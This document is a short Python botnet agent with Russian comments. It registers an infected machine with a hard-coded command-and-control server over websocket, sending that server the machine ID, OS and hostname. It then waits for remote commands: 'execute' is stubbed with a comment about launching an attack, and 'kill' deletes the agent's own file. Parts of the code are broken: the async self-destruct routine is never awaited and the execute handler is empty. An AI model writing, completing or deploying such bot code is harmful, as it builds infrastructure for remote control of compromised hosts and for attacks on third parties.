import asyncio
import websockets
import json
import platform
import os

C2_URL = 'ws://80.249.146.202:8888'
BOT_ID = open('/etc/machine-id' if platform.system() == 'Linux' else 'bot.id', 'r').read().strip()

async def connect():
    async with websockets.connect(C2_URL) as ws:
        # Регистрация
        await ws.send(json.dumps({
            'cmd': 'register',
            'bot_id': BOT_ID,
            'info': {
                'os': platform.system(),
                'hostname': platform.node(),
            },
            'bandwidth': 10  # TODO: реально замерить
        }))
        resp = await ws.recv()
        print('Registered:', resp)

        # Слушаем команды
        async for msg in ws:
            data = json.loads(msg)
            if data.get('cmd') == 'execute':
                # Выполнение команды (например, запуск атаки)
                pass
            elif data.get('cmd') == 'kill':
                self_destruct()

async def self_destruct():
    # Удаление агента и выход
    os.remove(__file__)
    exit(0)

asyncio.run(connect())
